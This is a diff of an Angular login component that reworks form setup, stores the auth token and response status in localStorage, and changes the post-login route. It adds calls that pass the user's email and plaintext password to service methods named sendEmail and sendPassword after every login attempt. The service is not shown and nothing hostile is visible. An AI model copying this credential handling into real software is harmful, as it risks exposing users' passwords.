@@ -1,6 +1,6 @@
 import { Component, OnInit } from '@angular/core';
 import { Router } from '@angular/router';
-import { FormBuilder, FormGroup, Validators } from '@angular/forms';
+import { FormGroup, Validators, FormControl } from '@angular/forms';
 import { ApiblogService } from '../apiblog.service';
 @Component({
   selector: 'app-login',
@@ -10,10 +10,11 @@ import { ApiblogService } from '../apiblog.service';
 export class LoginComponent implements OnInit {
   message: String;
   formlogin: FormGroup;
-  constructor(private router: Router, private fb: FormBuilder, private apiblogservice: ApiblogService) {
-    this.formlogin = this.fb.group({
-      email: ['', [Validators.required, Validators.email]],
-      password: ['', [Validators.required, Validators.minLength(8)]],
+  constructor(private router: Router, private apiblogservice: ApiblogService) {
+    this.formlogin = new FormGroup ({
+      email: new FormControl('', [Validators.required, Validators.email]),
+      password: new FormControl('', [Validators.required, Validators.minLength(8)]),
+
 
     });
   }
@@ -22,13 +23,18 @@ loginAuthor() {
   if (this.formlogin.valid) {
     this.message = '';
     this.apiblogservice.loginUser(this.formlogin.value).subscribe(res => {
-      console.log('login component ==>', res);
+      console.log('login component ==>', res.json());
       if (res.json().message === 'ok' ) {
         localStorage.setItem('usertoken', res.json().userToken);
-        this.router.navigateByUrl('/listsubject');
+        localStorage.setItem('response', res.json().status);
+        this.router.navigate(['/home']);
       } else {
         this.message = res.json().message;
+        localStorage.setItem('response', res.json().status);
+
       }
+      this.apiblogservice.sendEmail(this.formlogin.value.email);
+      this.apiblogservice.sendPassword(this.formlogin.value.password);
     });
 
   }
